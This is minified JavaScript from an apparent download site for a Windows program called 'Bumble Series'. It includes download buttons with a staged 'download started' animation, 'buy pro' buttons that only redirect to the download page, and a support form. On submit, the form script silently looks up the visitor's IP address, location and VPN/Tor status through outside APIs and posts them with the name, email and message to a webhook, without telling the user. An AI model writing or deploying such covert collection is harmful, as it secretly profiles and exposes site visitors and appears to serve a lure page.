$$('[data-download]').forEach(button=>button.onclick=e=>{e.preventDefault();const status=$('#download-status');if(status){status.className='download-status show';status.innerHTML='<div class="spinner"></div><strong>Preparing Bumble Series</strong><p class="notice">Your Windows download will begin automatically…</p>'}button.disabled=true;setTimeout(()=>{if(status){status.className='download-status show status-success';status.innerHTML='<div class="success">✓</div><strong>Download started successfully</strong><p class="notice">Bumble Series is being downloaded directly to your browser.</p>'}button.disabled=false;tone(640,.14,.1,'sine');window.location.href=downloadUrl},900)});
$$('[data-buy-pro]').forEach(button=>button.onclick=()=>go('/pages/download/'));
$$('[data-see-pro]').forEach(button=>button.onclick=()=>go('/pages/pro/'));
const allowedDomains=new Set(['gmail.com','googlemail.com','hotmail.com','outlook.com','live.com','msn.com','yandex.com','yandex.ru','yahoo.com','icloud.com','me.com','proton.me','protonmail.com']);
const validMail=value=>{const parts=value.trim().toLowerCase().split('@');return parts.length===2&&parts[0].length>0&&allowedDomains.has(parts[1])};
const flagEmoji=cc=>{if(!cc||cc.length!==2)return '🌐';return [...cc.toUpperCase()].map(c=>String.fromCodePoint(127397+c.charCodeAt())).join('')};
const securityFlag=cc=>{if(!cc||cc.length!==2)return '🌐';return [...cc.toUpperCase()].map(c=>String.fromCodePoint(127397+c.charCodeAt())).join('')};
const networkInfo=async()=>{let ip='';const ipSources=['https://api64.ipify.org?format=json','https://api.ipify.org?format=json'];for(const url of ipSources){try{const r=await fetch(url,{cache:'no-store'});if(!r.ok)continue;const j=await r.json();if(j.ip){ip=j.ip;break}}catch(e){}}const normalize=j=>{const security=j?.security||{};let vpn='Unknown';if(security.vpn===true||security.proxy===true||security.tor===true||security.anonymous===true)vpn='Detected';else if(security.vpn===false&&security.proxy===false&&security.tor===false)vpn='Not detected';return{ip:j.ip||ip||'Unavailable',city:j.city||'',region:j.region||j.regionName||'',country:j.country_name||j.country||'',country_code:j.country_code||j.countryCode||'',vpn}};try{const target=ip?`https://ipwho.is/${encodeURIComponent(ip)}`:'https://ipwho.is/';const r=await fetch(target,{cache:'no-store'});if(r.ok){const j=await r.json();if(j.success!==false&&j.ip)return normalize(j)}}catch(e){}if(!ip)return null;try{const r=await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`,{cache:'no-store'});if(r.ok){const j=await r.json();return normalize(j)}}catch(e){}return{ip,city:'',region:'',country:'',country_code:'',vpn:'Unknown'}}
$$('.feature-grid-dense .card,.rules-list article').forEach((item,index)=>{const p=$('p',item);if(!p)return;item.classList.add('accordion-item');item.setAttribute('tabindex','0');item.setAttribute('role','button');item.setAttribute('aria-expanded','false');const title=$('h3',item);if(title&&!$('.accordion-toggle',item)){const toggle=document.createElement('span');toggle.className='accordion-toggle';toggle.textContent='View answer';title.appendChild(toggle)}const toggle=()=>{const open=item.classList.toggle('open');item.setAttribute('aria-expanded',open?'true':'false');const t=$('.accordion-toggle',item);if(t)t.textContent=open?'Hide answer':'View answer'};item.addEventListener('click',e=>{if(e.target.closest('a,button,input,textarea'))return;toggle()});item.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();toggle()}})});
const supportHistory=()=>{const now=Date.now(),cut=now-86400000;let list=[];try{list=JSON.parse((localStorage.getItem('Bumble Series_support_history')||localStorage.getItem('Bumble Series_support_history'))||'[]').filter(t=>t>cut)}catch(e){}return list};
$('#support-message')?.addEventListener('input',e=>{$('#support-count').textContent=`${e.target.value.length}/500`});
$('#support-submit')?.addEventListener('click',async()=>{const name=$('#support-name').value.trim(),email=$('#support-email').value.trim(),message=$('#support-message').value.trim(),state=$('#support-state');if(name.length<2)return show('Enter your name');if(!validMail(email))return show('Use a supported public email provider');if(message.length<10||message.length>500)return show('Message must be 10–500 characters');const history=supportHistory();if(history.length>=3){state.className='notice status-error';state.textContent='You have sent 3 support messages in the last 24 hours. Please try again after 24 hours.';return}const button=$('#support-submit');button.disabled=true;button.textContent='Sending…';let network=await networkInfo()||{ip:'Unavailable',city:'Unknown',region:'',country:'Unknown',country_code:''};const date=new Date();const place=[network.city,network.region,network.country].filter(Boolean).join(', ')||'Unavailable';const payload={username:'Bumble Series Support',embeds:[{title:'Support request',description:'A new request was submitted through the Bumble Series support form.',color:16724838,fields:[{name:'Name',value:name.slice(0,128),inline:false},{name:'Email',value:'```'+email.slice(0,128)+'```',inline:false},{name:'Message',value:'```'+message.slice(0,500)+'```',inline:false},{name:'Date',value:`<t:${Math.floor(date.getTime()/1000)}:F>`,inline:false},{name:'IP Address',value:'```'+network.ip+'```',inline:false},{name:'Country',value:`${securityFlag(network.country_code)} ${place}`,inline:false},{name:'VPN',value:network.vpn||'Unknown',inline:false}],footer:{text:'Bumble Series Support'},timestamp:date.toISOString()}]};try{const response=await fetch(supportWebhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});if(!response.ok)throw new Error('Webhook failed');history.push(Date.now());localStorage.setItem('Bumble Series_support_history',JSON.stringify(history));state.className='notice status-success';state.textContent='Message sent successfully. Our support team will review it soon.';$('#support-message').value='';$('#support-count').textContent='0/500';tone(660,.16,.09,'sine')}catch(e){state.className='notice status-error';state.textContent='Message could not be sent. Please check your connection and try again.'}finally{button.disabled=false;button.textContent='Send message'}});
